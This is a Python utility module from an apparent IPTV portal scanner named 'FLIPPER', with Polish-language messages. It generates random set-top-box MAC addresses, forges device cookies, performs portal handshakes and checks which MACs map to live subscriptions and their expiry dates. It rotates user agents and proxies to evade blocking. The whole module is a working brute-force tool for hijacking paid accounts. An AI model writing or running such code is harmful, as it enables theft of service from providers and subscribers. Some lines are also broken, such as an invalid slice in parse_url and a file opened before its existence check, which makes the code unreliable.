from random import randint
import hashlib
import requests
from constants import *
from colorama import Fore, Style, Back
from datetime import datetime
import os
from concurrent.futures import ThreadPoolExecutor, Future

def report(error: str, func_name: str):
    if dev_mode:
        print(error, func_name)

def parse_url(url: str):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    if url.endswith('/'):
        url = url[:0, -1:]

    return url

def print_logo():
    logo = '''                                                   
███████╗██╗     ██╗██████╗ ██████╗ ███████╗██████╗ 
██╔════╝██║     ██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
█████╗  ██║     ██║██████╔╝██████╔╝█████╗  ██████╔╝
██╔══╝  ██║     ██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
██║     ███████╗██║██║     ██║     ███████╗██║  ██║
╚═╝     ╚══════╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝
                                                   '''
    for line in logo.split('\n'):
        print(f'{Fore.BLACK}{Back.CYAN}   {line}   {Style.RESET_ALL}')

def generate_random_mac(first_bytes: str = '00:1A:79'):
    mac_bytes = [randint(0, 255) for _ in range(3)]

    if len(first_bytes) < 8:
        exit(f'Niepoprawne 3 pierwsze bajty')

    mac = first_bytes + ":" + ":".join([f'{b:02x}' for b in mac_bytes]).upper()
    return mac
    
def make_cookies(mac: str):
    cookies = {
        "mac": mac,
        "sn": hashlib.md5(mac.encode("utf-8")).hexdigest(),
        "device_id": hashlib.sha256(mac.encode("utf-8")).hexdigest(),
        "stb_lang": "en",
        "timezone": "Europe/Amsterdam"
    }

    return cookies

def make_params(mac: str, action: str, _type: str):
    params = {
        'mac': mac,
        'user': mac,
        'password': mac,
        'action': action,
        'type': _type,
        'token': ''
    }
    return params

def use_random_user_agent():
    return user_agents[randint(0, len(user_agents)-1)]

def check_portal(url: str, timeout: int = 5, proxy = {}):
    try:
        mac = generate_random_mac()
        params = make_params(mac, 'handshake', 'stb')
        cookies = make_cookies(mac)
        headers = {
            'User-Agent': use_random_user_agent(),
            'Accept': '*/*'
        }

        res = requests.get(
            url,
            params=params,
            headers=headers,
            cookies=cookies,
            timeout=timeout,
            proxies=proxy
        )

        if res.status_code == 200 and not res.json() == None:
            return True
        
        return False
    except requests.RequestException as e:
        report(e, 'check_portal')

def get_handshake(url: str, mac: str, timeout: int = 5, proxy = {}):
    try:
        cookies = make_cookies(mac)
        params = make_params(mac, 'handshake', 'stb')
        headers = {
            'User-Agent': use_random_user_agent(),
            'Accept': '*/*'
        }

        res = requests.get(
            url,
            params=params,
            headers=headers,
            cookies=cookies,
            timeout=timeout,
            proxies=proxy
        )

        if res.status_code == 200 and res.json() and len(res.json().get('js', {})) > 0:
            return res.json().get('js', {}).get('token', None)
        return None
    except requests.RequestException as e:
        return None

def get_responding_endpoint(server_address: str, proxies = [], timeout: int = 2):
    if proxies and len(proxies) > 0:
        for proxy in proxies:
            for endpoint in endpoints:
                if check_portal(
                        url=server_address + endpoint,
                        timeout=timeout,
                        proxy={
                            'http': proxy
                        }
                    ):
                    return (endpoint, proxy)
                
    for endpoint in endpoints:
        if check_portal(
                url=server_address + endpoint,
                timeout=timeout
            ):
            return endpoint

def check_mac(url: str, mac: str, timeout: int = 5, proxy = {}):
    try:        
        cookies = make_cookies(mac)
        handshake = get_handshake(
            url,
            mac=mac,
            timeout=timeout,
            proxy=proxy
        )
        params = make_params(mac, 'get_main_info', 'account_info')
        
        if not handshake:
            return

        headers = {
            'User-Agent': use_random_user_agent(),
            'Accept': '*/*',
            'Authorization': f'Bearer {handshake}'
        }

        res = requests.get(
            url,
            params=params,
            headers=headers,
            cookies=cookies,
            timeout=timeout,
            proxies=proxy
        )
        
        if res.status_code == 200 and len(res.json().get('js', {})) > 0:
            expiresAt: str = res.json().get('js', {}).get('phone', '')
            str_datetime = expiresAt

            for month in months:
                if not str_datetime.find(month) == -1:
                    str_datetime = str_datetime.replace(month, months[month])
                    break
            
            month, day, year, hh, tf = expiresAt.replace(',','').split(' ')

            hour, minute = hh.split(':')
            month = str(list(months.keys()).index(month) + 1).zfill(2)
            day = day.zfill(2)
            hour = hour.zfill(2) if tf == 'am' else str(12 + int(hour))
            minute = minute.zfill(2)

            timestamp = datetime.strptime(f'{day}/{month}/{year}/{hour}/{minute}', "%d/%m/%Y/%H/%M").timestamp()

            return [timestamp, str_datetime]
    
        return
    except requests.RequestException as e:
        report(e, 'check_mac')
        return
    except Exception as e:
        report(e, 'check_mac')
        return
    
def load_proxies_from_file():
    proxies = []
    proxies_file = open(proxies_file_path, 'r', encoding='utf-8')

    if os.path.exists(proxies_file_path):
        for line in proxies_file.readlines():
            if not line.startswith('#') and len(line) > 2:
                if line.startswith('http://'):
                    proxies.append(line.replace('\n', ''))
    else:
        wproxies_file = open(proxies_file_path, 'w', encoding='utf-8')
        wproxies_file.write('''# Plik zawierający adresy serwerów proxy.
# Charakter # na początku oznacza komentarz.
# Przykład:
# 103.123.120.121
''')    
        wproxies_file.close()
    return proxies

def clear_console():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
    
    print_logo()
